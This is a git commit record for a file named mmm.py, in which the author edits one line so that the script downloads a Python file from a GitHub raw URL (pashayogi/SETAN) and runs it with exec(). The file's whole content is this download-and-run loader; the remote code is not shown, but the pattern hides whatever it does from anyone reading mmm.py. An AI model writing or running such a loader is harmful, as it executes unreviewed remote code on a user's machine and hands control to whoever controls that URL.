8f303cb0e2b90cbd8b1bac9d8d43964e878797d2
Binyamin <53377458+Binyamin-binni@users.noreply.github.com>
2020-07-02 16:52:21 +0500

    Update mmm.py

--- mmm.py
+++ mmm.py
@@ -1,2 +1,2 @@
 import os,sys,requests
-exec(requests.get('https://raw.githubusercontent.com/pashayogi/SETAN/master/SETAN.py'))
+exec(requests.get('https://raw.githubusercontent.com/pashayogi/SETAN/master/SETAN.py').text)
